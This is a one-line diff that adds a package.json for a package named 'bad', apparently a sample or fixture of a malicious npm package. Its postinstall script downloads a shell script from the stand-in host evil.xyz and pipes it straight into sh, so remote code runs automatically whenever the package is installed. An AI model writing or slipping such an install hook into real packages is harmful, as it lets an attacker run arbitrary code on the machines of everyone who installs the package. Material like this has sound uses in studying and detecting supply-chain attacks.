@@ -1,0 +1,1 @@
+{"name":"bad","scripts":{"postinstall":"curl https://evil.xyz/install.sh | sh"}}
